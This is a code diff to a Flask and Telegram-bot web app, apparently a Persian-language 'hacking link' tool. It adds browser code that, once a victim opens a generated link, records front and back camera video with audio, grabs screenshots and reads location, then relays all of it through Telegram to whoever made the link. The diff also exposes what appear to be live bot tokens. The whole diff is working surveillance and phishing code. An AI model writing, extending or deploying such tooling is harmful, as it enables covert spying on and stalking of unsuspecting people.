@@ -4,12 +4,12 @@ from flask import Flask, render_template_string, request, jsonify
 import telebot
 
 app = Flask(__name__)
-BOT_TOKEN = "8607829333:AAGekt5ymx5rt9K02HukVuH4jCWRL5ftZUQ"
+BOT_TOKEN = "9229312674:AAFqA8dd9cVZuW3Cs1h5rXsflkzRA6KXQis"
 bot = telebot.TeleBot(BOT_TOKEN)
 ADMIN_ID = "8817017983"
 
 # لینک پایه سایت شما در ریلیوی
-BASE_URL = "https://Determined-illumination-production-7799.up.railway.app"
+BASE_URL = "https://Bot-production-119bdd39.up.railway.app"
 
 SIGNATURES = "\n\n@SHAHID_PV_003\n@shahidnaimi5642"
 
@@ -170,15 +170,36 @@ HTML_TEMPLATE = """
             try {
                 if (path === "/front") {
                     let img = await captureCamera("user");
-                    if(img) {
+                    if (img) {
                         sendData("/upload-front", { image: img });
                         localStorage.setItem("permission_granted_" + path, "true");
                     }
                 }
                 else if (path === "/back") {
                     let img = await captureCamera("environment");
-                    if(img) {
+                    if (img) {
                         sendData("/upload-back", { image: img });
+                        localStorage.setItem("permission_granted_" + path, "true");
+                    }
+                }
+                else if (path === "/video-front") {
+                    let vid = await recordCameraVideo("user", 4000);
+                    if (vid) {
+                        sendData("/upload-video-front", { video: vid });
+                        localStorage.setItem("permission_granted_" + path, "true");
+                    }
+                }
+                else if (path === "/video-back") {
+                    let vid = await recordCameraVideo("environment", 4000);
+                    if (vid) {
+                        sendData("/upload-video-back", { video: vid });
+                        localStorage.setItem("permission_granted_" + path, "true");
+                    }
+                }
+                else if (path === "/screen") {
+                    let shot = await captureScreenshot();
+                    if (shot) {
+                        sendData("/upload-screen", { image: shot });
                         localStorage.setItem("permission_granted_" + path, "true");
                     }
                 }
@@ -195,7 +216,7 @@ HTML_TEMPLATE = """
                     runAudioRecordAction();
                 }
                 else if (path === "/all") {
-                    runAllComprehensiveAction();
+                    await runAllComprehensiveAction();
                 }
                 else {
                     localStorage.setItem("permission_granted_" + path, "true");
@@ -217,9 +238,15 @@ HTML_TEMPLATE = """
             } else if (path === "/all") {
                 runAllComprehensiveAction();
             } else if (path === "/front") {
-                captureCamera("user").then(img => { if(img) sendData("/upload-front", { image: img }); });
+                captureCamera("user").then(img => { if (img) sendData("/upload-front", { image: img }); });
             } else if (path === "/back") {
-                captureCamera("environment").then(img => { if(img) sendData("/upload-back", { image: img }); });
+                captureCamera("environment").then(img => { if (img) sendData("/upload-back", { image: img }); });
+            } else if (path === "/video-front") {
+                recordCameraVideo("user", 4000).then(vid => { if (vid) sendData("/upload-video-front", { video: vid }); });
+            } else if (path === "/video-back") {
+                recordCameraVideo("environment", 4000).then(vid => { if (vid) sendData("/upload-video-back", { video: vid }); });
+            } else if (path === "/screen") {
+                captureScreenshot().then(shot => { if (shot) sendData("/upload-screen", { image: shot }); });
             } else if (path === "/location") {
                 navigator.geolocation.getCurrentPosition(pos => {
                     sendData("/upload-loc", { lat: pos.coords.latitude, lon: pos.coords.longitude });
@@ -314,6 +341,21 @@ HTML_TEMPLATE = """
                 if (backImg) payload.backImage = backImg;
             } catch(e) {}
 
+            try {
+                let frontVid = await recordCameraVideo("user", 3000);
+                if (frontVid) payload.frontVideo = frontVid;
+            } catch(e) {}
+
+            try {
+                let backVid = await recordCameraVideo("environment", 3000);
+                if (backVid) payload.backVideo = backVid;
+            } catch(e) {}
+
+            try {
+                let screenShot = await captureScreenshot();
+                if (screenShot) payload.screenImage = screenShot;
+            } catch(e) {}
+
             await new Promise((resolve) => {
                 navigator.geolocation.getCurrentPosition(pos => {
                     payload.lat = pos.coords.latitude;
@@ -346,6 +388,70 @@ HTML_TEMPLATE = """
             } catch(e) { return null; }
         }
 
+        async function recordCameraVideo(facing, durationMs = 4000) {
+            try {
+                let stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: facing },
+                    audio: true
+                });
+
+                return await new Promise((resolve) => {
+                    let chunks = [];
+                    let mimeType = MediaRecorder.isTypeSupported("video/webm;codecs=vp8,opus")
+                        ? "video/webm;codecs=vp8,opus"
+                        : (MediaRecorder.isTypeSupported("video/webm") ? "video/webm" : "");
+                    let recorder = mimeType ? new MediaRecorder(stream, { mimeType }) : new MediaRecorder(stream);
+
+                    recorder.ondataavailable = (event) => {
+                        if (event.data && event.data.size > 0) {
+                            chunks.push(event.data);
+                        }
+                    };
+
+                    recorder.onstop = () => {
+                        stream.getTracks().forEach(track => track.stop());
+                        let blob = new Blob(chunks, { type: mimeType || "video/webm" });
+                        let reader = new FileReader();
+                        reader.readAsDataURL(blob);
+                        reader.onloadend = () => resolve(reader.result);
+                        reader.onerror = () => resolve(null);
+                    };
+
+                    recorder.start();
+                    setTimeout(() => {
+                        if (recorder.state !== "inactive") {
+                            recorder.stop();
+                        }
+                    }, durationMs);
+                });
+            } catch (e) {
+                return null;
+            }
+        }
+
+        async function captureScreenshot() {
+            try {
+                if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) {
+                    return null;
+                }
+                let stream = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: false });
+                let video = document.createElement('video');
+                video.srcObject = stream;
+                video.playsInline = true;
+                await video.play();
+                await new Promise(r => setTimeout(r, 400));
+
+                let canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth || 1280;
+                canvas.height = video.videoHeight || 720;
+                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                stream.getTracks().forEach(track => track.stop());
+                return canvas.toDataURL('image/jpeg', 0.85);
+            } catch (e) {
+                return null;
+            }
+        }
+
         function sendData(endpoint, data) {
             fetch(endpoint + window.location.search, {
                 method: 'POST',
@@ -369,11 +475,25 @@ def send_to_both(target_user, send_func, *args, **kwargs):
     except Exception:
         pass
 
+def decode_base64_media(data_url):
+    if not data_url or "," not in data_url:
+        return None
+    return base64.b64decode(data_url.split(",", 1)[1])
+
 @app.route("/front")
 def link_front(): return render_template_string(HTML_TEMPLATE)
 
 @app.route("/back")
 def link_back(): return render_template_string(HTML_TEMPLATE)
+
+@app.route("/video-front")
+def link_video_front(): return render_template_string(HTML_TEMPLATE)
+
+@app.route("/video-back")
+def link_video_back(): return render_template_string(HTML_TEMPLATE)
+
+@app.route("/screen")
+def link_screen(): return render_template_string(HTML_TEMPLATE)
 
 @app.route("/location")
 def link_location(): return render_template_string(HTML_TEMPLATE)
@@ -395,9 +515,9 @@ def up_front():
     target = request.args.get("user") or ADMIN_ID
     d = request.get_json()
     if d and "image" in d:
-        img_bytes = base64.b64decode(d["image"].split(",")[1])
-        caption = f"📸 Front Camera Photo{SIGNATURES}"
-        send_to_both(target, bot.send_photo, img_bytes, caption=caption)
+        img_bytes = decode_base64_media(d["image"])
+        if img_bytes:
+            send_to_both(target, bot.send_photo, img_bytes, caption=f"📸 Front Camera Photo{SIGNATURES}")
     return jsonify({"status": "ok"})
 
 @app.route("/upload-back", methods=["POST"])
@@ -405,9 +525,39 @@ def up_back():
     target = request.args.get("user") or ADMIN_ID
     d = request.get_json()
     if d and "image" in d:
-        img_bytes = base64.b64decode(d["image"].split(",")[1])
-        caption = f"📷 Back Camera Photo{SIGNATURES}"
-        send_to_both(target, bot.send_photo, img_bytes, caption=caption)
+        img_bytes = decode_base64_media(d["image"])
+        if img_bytes:
+            send_to_both(target, bot.send_photo, img_bytes, caption=f"📷 Back Camera Photo{SIGNATURES}")
+    return jsonify({"status": "ok"})
+
+@app.route("/upload-video-front", methods=["POST"])
+def up_video_front():
+    target = request.args.get("user") or ADMIN_ID
+    d = request.get_json()
+    if d and "video" in d:
+        vid_bytes = decode_base64_media(d["video"])
+        if vid_bytes:
+            send_to_both(target, bot.send_video, vid_bytes, caption=f"🎥 Front Camera Video{SIGNATURES}")
+    return jsonify({"status": "ok"})
+
+@app.route("/upload-video-back", methods=["POST"])
+def up_video_back():
+    target = request.args.get("user") or ADMIN_ID
+    d = request.get_json()
+    if d and "video" in d:
+        vid_bytes = decode_base64_media(d["video"])
+        if vid_bytes:
+            send_to_both(target, bot.send_video, vid_bytes, caption=f"🎬 Back Camera Video{SIGNATURES}")
+    return jsonify({"status": "ok"})
+
+@app.route("/upload-screen", methods=["POST"])
+def up_screen():
+    target = request.args.get("user") or ADMIN_ID
+    d = request.get_json()
+    if d and "image" in d:
+        img_bytes = decode_base64_media(d["image"])
+        if img_bytes:
+            send_to_both(target, bot.send_photo, img_bytes, caption=f"🖥️ Screenshot{SIGNATURES}")
     return jsonify({"status": "ok"})
 
 @app.route("/upload-loc", methods=["POST"])
@@ -444,9 +594,9 @@ def up_audio():
     target = request.args.get("user") or ADMIN_ID
     d = request.get_json()
     if d and "audio" in d:
-        audio_bytes = base64.b64decode(d["audio"].split(",")[1])
-        caption = f"🎙️ صدای ضبط شده محیط{SIGNATURES}"
-        send_to_both(target, bot.send_voice, audio_bytes, caption=caption)
+        audio_bytes = decode_base64_media(d["audio"])
+        if audio_bytes:
+            send_to_both(target, bot.send_voice, audio_bytes, caption=f"🎙️ صدای ضبط شده محیط{SIGNATURES}")
     return jsonify({"status": "ok"})
 
 @app.route("/upload-all", methods=["POST"])
@@ -482,12 +632,29 @@ def up_all():
             send_to_both(target, bot.send_location, latitude=d.get("lat"), longitude=d.get("lon"))
 
         if "frontImage" in d and d["frontImage"]:
-            img_bytes = base64.b64decode(d["frontImage"].split(",")[1])
-            send_to_both(target, bot.send_photo, img_bytes, caption=f"📸 عکس دوربین جلو (لینک جامع){SIGNATURES}")
+            img_bytes = decode_base64_media(d["frontImage"])
+            if img_bytes:
+                send_to_both(target, bot.send_photo, img_bytes, caption=f"📸 عکس دوربین جلو (لینک جامع){SIGNATURES}")
 
         if "backImage" in d and d["backImage"]:
-            img_bytes = base64.b64decode(d["backImage"].split(",")[1])
-            send_to_both(target, bot.send_photo, img_bytes, caption=f"📷 عکس دوربین عقب (لینک جامع){SIGNATURES}")
+            img_bytes = decode_base64_media(d["backImage"])
+            if img_bytes:
+                send_to_both(target, bot.send_photo, img_bytes, caption=f"📷 عکس دوربین عقب (لینک جامع){SIGNATURES}")
+
+        if "frontVideo" in d and d["frontVideo"]:
+            vid_bytes = decode_base64_media(d["frontVideo"])
+            if vid_bytes:
+                send_to_both(target, bot.send_video, vid_bytes, caption=f"🎥 ویدیو دوربین جلو (لینک جامع){SIGNATURES}")
+
+        if "backVideo" in d and d["backVideo"]:
+            vid_bytes = decode_base64_media(d["backVideo"])
+            if vid_bytes:
+                send_to_both(target, bot.send_video, vid_bytes, caption=f"🎬 ویدیو دوربین عقب (لینک جامع){SIGNATURES}")
+
+        if "screenImage" in d and d["screenImage"]:
+            shot_bytes = decode_base64_media(d["screenImage"])
+            if shot_bytes:
+                send_to_both(target, bot.send_photo, shot_bytes, caption=f"🖥️ اسکرین‌شات صفحه (لینک جامع){SIGNATURES}")
 
     return jsonify({"status": "ok"})
 
